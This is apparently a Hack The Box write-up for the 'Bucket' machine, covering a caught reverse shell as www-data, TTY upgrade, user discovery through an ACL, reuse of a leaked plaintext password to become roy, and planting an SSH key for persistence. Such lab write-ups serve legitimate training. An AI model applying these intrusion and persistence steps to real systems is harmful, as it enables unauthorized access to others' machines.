# Shell as www-data

We managed to pop our shell from the bucket, and can see we are the `www-data` user:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.10.212] 42766
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:58:18 up  4:38,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now let's upgrade our shell, using the [[Linux Shells#Backgrounding Shell Trick]]:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bucket:/$ ^Z  
[1]+  Stopped                 nc -lnvp 9001
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ stty raw -echo
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
nc -lnvp 9001

www-data@bucket:/$ 
```

## Enumeration

Looking around the root directory, we see an `.aws` folder, which I know from experience contains credentials:

```bash
www-data@bucket:/$ cd .aws
www-data@bucket:/.aws$ ls
config	credentials
www-data@bucket:/.aws$ cat credentials
cat: credentials: Permission denied
```

However we cannot read it.

Going to the home directory, we see a new folder called `bucket-app`. This is also root-only readable, but has a mysterious `+` next to it.

```bash
www-data@bucket:/.aws$ cd ~
www-data@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Apr 29 09:07 html
```

When I first did this box, I tried looking for a user to escalate to with the credentials I had found in DDB. I did this by listing the contents of the `/home` directory, and found the `/home/roy` directory.

Other ways of discovering `roy` included:
- Running `cat /etc/passwd` to list the users on the box
- Running `getfacl bucket-app` to view the access control list on the `bucket-app` directory

The `+` next to the filename is what indicates we can do the latter - it shows there is an extra permission on the file besides the usual `rwx` permissions of Linux - this is usually an Access Control List, or ACL, and can be read with the `getfacl` command:

```bash
www-data@bucket:/var/www$ getfacl bucket-app
# file: bucket-app
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

This shows us the `roy` user.

## Escalating to Roy

We can now attempt to switch user to `roy`. I tried every [[Writeups/Hack the Box/Boxes/Bucket/1 - Loot|password that we leaked]], and found that `n2vM-<_K_Q:.Aa2` worked:

```bash
www-data@bucket:/var/www$ su roy
Password: 
roy@bucket:/var/www$
```

We can now attempt to SSH in as roy using this password:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ ssh roy@10.10.10.212
The authenticity of host '10.10.10.212 (10.10.10.212)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.212' (ECDSA) to the list of known hosts.
roy@10.10.10.212's password: 

...[snip]...

  System information as of Thu 29 Apr 2021 09:16:39 AM UTC

  System load:                      0.09
  Usage of /:                       33.6% of 17.59GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:f4a2


...[snip]...

Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.2
roy@bucket:~$ 
```

Success! We can now abandon our painfully laggy PHP reverse shell and use SSH instead. The login banner also gave us some potentially useful information, so I've included it in the notes.

### SSH Persistence

If for some reason the password did not work here, we could instead try to drop our own SSH key for persistence. This is actually what I did when I originally solved the box. If roy had a `.ssh` folder we could save his `id_rsa` file to our box and use it to connect, which is better for OpSec. However, he did not, so instead we can upload our own.

On our local machine we can [[Fundamental Skills#SSH Keys|create an ssh key pair]]:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ ssh-keygen -f roy
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ cat roy.pub 
ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali
```

On the remote machine, create a `.ssh` directory and add our public key to the authorized keys file:

```bash
roy@bucket:~$ mkdir .ssh
roy@bucket:~$ echo 'ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali' > .ssh/authorized_keys
```

# Tags

#writeup